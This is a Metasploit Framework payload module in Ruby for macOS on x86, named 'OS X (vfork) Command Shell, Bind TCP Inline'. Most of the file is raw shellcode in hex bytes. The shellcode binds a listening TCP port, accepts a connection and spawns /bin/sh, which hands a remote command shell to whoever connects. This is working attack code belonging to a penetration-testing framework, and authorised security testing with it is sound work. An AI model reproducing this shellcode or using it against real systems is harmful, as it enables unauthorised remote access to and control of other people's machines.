##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Osx
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'OS X (vfork) Command Shell, Bind TCP Inline',
      'Description'   => 'Listen for a connection, vfork if necessary, and spawn a command shell',
      'Author'        => 'ddz',
      'License'       => MSF_LICENSE,
      'Platform'      => 'osx',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'LPORT'    => [ 27, 'n' ],
            },
          'Payload' =>
            "\x31\xc0\x99\x50\x40\x50\x40\x50"+
            "\x52\xb0\x61\xcd\x80\x0f\x82\x7e"+
            "\x00\x00\x00\x89\xc6\x52\x52\x52"+
            "\x68\x00\x02\x34\x12\x89\xe3\x6a"+
            "\x10\x53\x56\x52\xb0\x68\xcd\x80"+
            "\x72\x67\x52\x56\x52\xb0\x6a\xcd"+
            "\x80\x72\x5e\x52\x52\x56\x52\xb0"+
            "\x1e\xcd\x80\x72\x54\x89\xc7\x31"+
            "\xdb\x83\xeb\x01\x43\x53\x57\x53"+
            "\xb0\x5a\xcd\x80\x72\x43\x83\xfb"+
            "\x03\x75\xf1\x31\xc0\x50\x50\x50"+
            "\x50\xb0\x3b\xcd\x80\x90\x90\x3c"+
            "\x2d\x75\x09\xb0\x42\xcd\x80\x83"+
            "\xfa\x00\x74\x17\x31\xc0\x50\x68"+
            "\x2f\x2f\x73\x68\x68\x2f\x62\x69"+
            "\x6e\x89\xe3\x50\x50\x53\x50\xb0"+
            "\x3b\xcd\x80\x31\xc0\x50\x89\xe3"+
            "\x50\x50\x53\x50\x50\xb0\x07\xcd"+
            "\x80\x31\xc0\x50\x50\x40\xcd\x80"
        }
      ))
  end

end
